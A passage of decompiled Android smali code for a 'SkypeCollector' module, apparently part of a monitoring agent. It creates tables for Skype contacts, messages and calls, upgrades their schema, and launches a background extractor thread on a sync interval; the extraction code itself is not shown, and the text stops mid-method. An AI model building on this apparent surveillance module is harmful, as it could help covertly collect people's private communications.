.class public Lcom/hp/vd/module/custom/SkypeCollector;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "SkypeCollector.java"


# static fields
.field public static final ATTRIBUTE_MAX_CALL_ID:Ljava/lang/String; = "max_call_id"

.field public static final ATTRIBUTE_MAX_CONTACT_ID:Ljava/lang/String; = "max_contact_id"

.field public static final ATTRIBUTE_MAX_MESSAGE_ID:Ljava/lang/String; = "max_message_id"

.field public static final ATTRIBUTE_MAX_READ_CALL_PER_ITERATION:Ljava/lang/String; = "500"

.field public static final ATTRIBUTE_MAX_READ_CONTACT_PER_ITERATION:Ljava/lang/String; = "200"

.field public static final ATTRIBUTE_MAX_READ_MESSAGE_PER_ITERATION:Ljava/lang/String; = "500"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "synchronization_interval"

.field public static final ATTRIBUTE_USERNAME:Ljava/lang/String; = "skype_username"

.field public static final ATTRIBUTE_V8_MAX_MESSAGE_ID:Ljava/lang/String; = "v8_max_message_id"

.field public static final ATTRIBUTE_V8_MAX_READ_MESSAGE_PER_ITERATION:Ljava/lang/String; = "750"


# instance fields
.field protected extractorThread:Ljava/lang/Thread;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected skypeCallDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeCallData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected skypeContactDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeContactData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected skypeMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 36
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 61
    iput-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->skypeContactDao:Lcom/j256/ormlite/dao/Dao;

    .line 62
    iput-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->skypeMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 63
    iput-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->skypeCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 65
    iput-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->extractorThread:Ljava/lang/Thread;

    .line 66
    iput-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 67
    iput-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 72
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "custom"

    .line 74
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 75
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 76
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 77
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x3

    .line 78
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v3.0"

    .line 79
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "max_contact_id=0;"

    .line 81
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 82
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "max_message_id=0;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 83
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "max_call_id=0;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 84
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "synchronization_interval=3460;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 86
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    const/16 v1, 0xa

    .line 88
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 89
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "SkypeCollector"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 9

    .line 386
    iget-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->lastSynchronization:Ljava/lang/Long;

    .line 387
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 388
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 390
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x1

    return v0

    .line 394
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/custom/SkypeCollector;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x0

    return v0
.end method

.method public initialize()Z
    .locals 5

    .line 292
    iget-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 300
    :try_start_0
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    const-class v3, Lcom/hp/vd/data/SkypeContactData;

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->skypeContactDao:Lcom/j256/ormlite/dao/Dao;

    .line 301
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    const-class v3, Lcom/hp/vd/data/SkypeMessageData;

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->skypeMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 302
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    const-class v3, Lcom/hp/vd/data/SkypeCallData;

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->skypeCallDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1

    .line 311
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->moduleData:Lcom/hp/vd/data/ModuleData;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    const/4 v0, 0x1

    return v0

    :catch_0
    move-exception v2

    const-string v3, "ModuleAbstract"

    const-string v4, "Exception caught while loading moduleData"

    .line 314
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_1
    move-exception v2

    const-string v3, "ModuleAbstract"

    const-string v4, "Exception caught while generating DAOs"

    .line 305
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 97
    iget-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 104
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v1

    .line 106
    const-class v2, Lcom/hp/vd/data/SkypeContactData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I

    .line 111
    const-class v2, Lcom/hp/vd/data/SkypeMessageData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I

    .line 116
    const-class v2, Lcom/hp/vd/data/SkypeCallData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 130
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    return p1

    :catch_0
    move-exception p1

    const-string v1, "ModuleAbstract"

    const-string v2, "install(): exception caught during creating-second level tables"

    .line 121
    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 p1, 0x0

    return p1
.end method

.method public isStarted()Z
    .locals 1

    const/4 v0, 0x0

    return v0
.end method

.method public start()Z
    .locals 9

    .line 331
    iget-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v7

    const-string v0, "ModuleAbstract"

    const-string v1, "start() called."

    .line 332
    invoke-interface {v7, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 334
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 342
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->hasUpdateIntervalExpired()Z

    move-result v0

    const/4 v8, 0x1

    if-ne v0, v8, :cond_1

    return v8

    .line 350
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-nez v0, :cond_3

    .line 352
    :cond_2
    new-instance v0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;

    .line 353
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/custom/SkypeCollector;->skypeContactDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v4, p0, Lcom/hp/vd/module/custom/SkypeCollector;->skypeMessageDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/custom/SkypeCollector;->skypeCallDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v6, p0, Lcom/hp/vd/module/custom/SkypeCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v1, v0

    invoke-direct/range {v1 .. v7}, Lcom/hp/vd/module/custom/skype/SkypeExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 361
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Skype-Extractor-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/custom/SkypeCollector;->extractorThread:Ljava/lang/Thread;

    .line 362
    iget-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_3
    return v8
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public update(Lcom/hp/vd/module/IModule;)Z
    .locals 5

    .line 136
    iget-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "ModuleAbstract"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "update(): updating from: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3

    iget-object v3, v3, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 137
    iget-object v0, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "ModuleAbstract"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "update(): updating to: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3

    iget-object v3, v3, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 143
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v0

    iget-object v0, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    const/4 v1, 0x3

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-ne v0, v3, :cond_1

    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v0

    iget-object v0, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    if-ne v0, v1, :cond_1

    .line 144
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->upgradeFromV1toV3()Z

    move-result p1

    if-nez p1, :cond_0

    return v2

    :cond_0
    return v3

    .line 151
    :cond_1
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v0

    iget-object v0, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    const/4 v4, 0x2

    if-ne v0, v4, :cond_3

    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v0

    iget-object v0, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    if-ne v0, v1, :cond_3

    .line 152
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->upgradeFromV2toV3()Z

    move-result p1

    if-nez p1, :cond_2

    return v2

    :cond_2
    return v3

    .line 159
    :cond_3
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1

    iget-object p1, p1, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    if-ne p1, v3, :cond_5

    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1

    iget-object p1, p1, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    if-ne p1, v4, :cond_5

    .line 160
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->upgradeFromV1toV2()Z

    move-result p1

    if-nez p1, :cond_4

    return v2

    :cond_4
    return v3

    :cond_5
    return v2
.end method

.method protected upgradeFromV1toV2()Z
    .locals 7

    const/4 v0, 0x0

    const/4 v1, 0x0

    .line 256
    :try_start_0
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    const-string v1, "BEGIN"

    .line 258
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "ALTER TABLE module_skype_contact ADD COLUMN profile TEXT"

    .line 260
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "ALTER TABLE module_skype_call ADD COLUMN profile TEXT"

    .line 261
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "ALTER TABLE module_skype_message ADD COLUMN profile TEXT"

    .line 262
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "ALTER TABLE module_skype_call ADD COLUMN status INTEGER"

    .line 265
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    const-string v1, "COMMIT"

    .line 267
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    .line 269
    iget-object v1, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v3, "ModuleAbstract"

    const-string v4, "update(v2): altering skype tables was successfull"

    invoke-interface {v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_0

    const/4 v0, 0x1

    return v0

    :catch_0
    move-exception v1

    goto :goto_0

    :catch_1
    move-exception v2

    move-object v6, v2

    move-object v2, v1

    move-object v1, v6

    .line 272
    :goto_0
    iget-object v3, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v3

    const-string v4, "ModuleAbstract"

    const-string v5, "update(v2): exception caught while altering skype tables"

    invoke-interface {v3, v4, v5, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eqz v2, :cond_0

    :try_start_2
    const-string v1, "ROLLBACK"

    .line 276
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/sql/SQLException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_1

    :catch_2
    move-exception v1

    .line 280
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    const-string v3, "ModuleAbstract"

    const-string v4, "update(v2): exception caught on TRANSACTION ROLLBACK"

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    :goto_1
    return v0
.end method

.method protected upgradeFromV1toV3()Z
    .locals 7

    const/4 v0, 0x0

    const/4 v1, 0x0

    .line 175
    :try_start_0
    iget-object v2, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1

    .line 176
    :try_start_1
    iget-object v1, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v3, "BEGIN"

    .line 178
    new-array v4, v0, [Ljava/lang/String;

    invoke-interface {v2, v3, v4}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    .line 180
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->upgradeFromV1toV2()Z

    move-result v3

    const/4 v4, 0x3

    if-nez v3, :cond_0

    const-string v3, "ModuleAbstract"

    const-string v5, "upgradeFromV1toV3(): while upgrading from v1-to-v3: step v1-to-v2 failed"

    .line 181
    invoke-interface {v1, v3, v5, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v0

    .line 186
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/SkypeCollector;->upgradeFromV2toV3()Z

    move-result v3

    if-nez v3, :cond_1

    const-string v3, "ModuleAbstract"

    const-string v5, "upgradeFromV1toV3(): while upgrading from v1-to-v3: step v2-to-v3 failed"

    .line 187
    invoke-interface {v1, v3, v5, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v0

    :cond_1
    const-string v1, "COMMIT"

    .line 192
    new-array v3, v0, [Ljava/lang/String;

    invoke-interface {v2, v1, v3}, Lcom/j256/ormlite/dao/Dao;->executeRaw(Ljava/lang/String;[Ljava/lang/String;)I

    .line 193
    iget-object v1, p0, Lcom/hp/vd/module/custom/SkypeCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v3, "ModuleAbstract"

    const-string v4, "update(v1to3): altering skype tables was successfull"

